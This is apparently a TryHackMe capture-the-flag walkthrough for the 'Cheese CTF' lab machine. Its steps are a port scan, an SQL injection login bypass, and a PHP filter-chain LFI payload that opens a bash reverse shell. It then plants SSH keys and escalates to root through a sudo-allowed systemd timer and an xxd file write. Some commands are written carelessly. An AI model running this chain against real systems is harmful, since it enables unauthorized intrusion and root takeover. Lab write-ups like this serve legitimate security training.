# Cheese CTF (TryHackme)

## Machine Info:

* **IP:** 10.10.74.69
* **Name:** CheeseCTF

---

## Step 1 | Rustscan 

**Command**

```
rustscan -a <IP>
```

**Output:**

```
Open 10.10.74.69:1
Open 10.10.74.69:2
Open 10.10.74.69:3
Open 10.10.74.69:6
Open 10.10.74.69:7
Open 10.10.74.69:4
Open 10.10.74.69:5
Open 10.10.74.69:8
Open 10.10.74.69:9
Open 10.10.74.69:31
Open 10.10.74.69:39
Open 10.10.74.69:37
Open 10.10.74.69:32
Open 10.10.74.69:42
Open 10.10.74.69:40
Open 10.10.74.69:43
Open 10.10.74.69:33
Open 10.10.74.69:45
Open 10.10.74.69:34
Open 10.10.74.69:50
Open 10.10.74.69:52
Open 10.10.74.69:35
Open 10.10.74.69:55
Open 10.10.74.69:56
Open 10.10.74.69:11
Open 10.10.74.69:12
Open 10.10.74.69:10
Open 10.10.74.69:36
Open 10.10.74.69:13
Open 10.10.74.69:16
Open 10.10.74.69:17
Open 10.10.74.69:19
Open 10.10.74.69:18
Open 10.10.74.69:14
Open 10.10.74.69:15
Open 10.10.74.69:20
Open 10.10.74.69:21
Open 10.10.74.69:25
Open 10.10.74.69:23
Open 10.10.74.69:22
Open 10.10.74.69:24
Open 10.10.74.69:26
Open 10.10.74.69:27
Open 10.10.74.69:28
Open 10.10.74.69:29
Open 10.10.74.69:30
...
Almost all ports were open. This was intended to confuse or mislead the target.
```

## Step 2 | Visit Page

I vizited to `http://10.10.74.69` page.

**Found**

`/login.php`

## Step 3 | OWASP Top Vulnerabilities

I tried XSS, Brute-Force, SQLi or smth to this site and i found `SQLi` vulnerability.

```
username: admin' || '1'='1'; -- -

password: <random>
```

**Found**

Accessed `Admin` panel.

## Step 4 | Found LFI

The admin panel looked quite empty, but when I checked the URL, I noticed a Local File Inclusion vulnerability. By manipulating the parameters in the URL, we can include files, but the server is using PHP filters. Therefore, I will use php_filter.

## Step 5 | PHP Filter For LFI Attack

```
python3 php_filter_chain_generator.py --chain "<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/YourIP/YourPort 0>&1'\"); ?>" | grep "^php" > payload.txt

cat payload.txt

nc -lvnp <your_port>
```

We remove the .php part and everything after it in the URL, then paste this payload.exe

**Output:**

```
listening on [any] 1234 ...
connect to [10.21.230.108] from (UNKNOWN) [10.10.74.69] 41544
bash: cannot set terminal process group (928): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ip-10-10-74-69:/var/www/html$ _
```

## Step 6 | Linpeas.sh

**Sacrifice Machine:**

```
wget http://<your ip>/linpeas.sh

chmod +x linpeas.sh

./linpeas.sh
```

**Found:**

`/etc/systemd`/system/exploit.timer

and

`/home/comte/.ssh/authorized_keys`


## Step 7 | Create SSH Key in AttackerMachine

```
ssh-keygen -t rsa

cat .ssh/id_rsa.pub
```

**Output:**

`ssh-rsa AAAAB3Nz...`

## Step 8 | Write Your SSH Key to authorized_keys

**SacrificeMachine:**

```
echo "YOUR_SSH_KEY
```

## Step 9 | Connect to SSH With id_rsa.pub

**AttackerMachine:**

```
ssh -i id_rsa comte@<IP>

ls
```

**Found:**

`user.txt`

## Step 10 | Privilege Escalation

**SacrificeMachine:**

```
sudo -l
```

**Output:**

```
User comte may run the following commands on ip-10-10-74-69:
    (ALL) NOPASSWD: /bin/systemctl daemon-reload
    (ALL) NOPASSWD: /bin/systemctl restart exploit.timer
    (ALL) NOPASSWD: /bin/systemctl start exploit.timer
    (ALL) NOPASSWD: /bin/systemctl enable exploit.timer
```

**SacrificeMachine:**

```
cat /etc/systemd/system/exploit.timer
```

**Output:**

```
[Unit]                                              
Description=Exploit Timer

[Timer]                             
OnBootSec=     ===>     OnBootSec=5s   //CHANGE LIKE THIS

[Install]
WantedBy=timers.target
```

**SacrificeMachine:**

```
cat exploit.service
```

**Found:**

```
....../xxd
```

Search "xxd" on GTFOBins. Select to "File Write"

```
echo "YOUR_SSH_KEY" | /opt/xxd | /opt/xxd-r - /root/.ssh/authorized_keys
```

## Step 11 | Connect SSH With Root User

**AttackerMachine**

```
ssh -i id_rsa root@IP

ls
```

**Found:**

`root.txt`
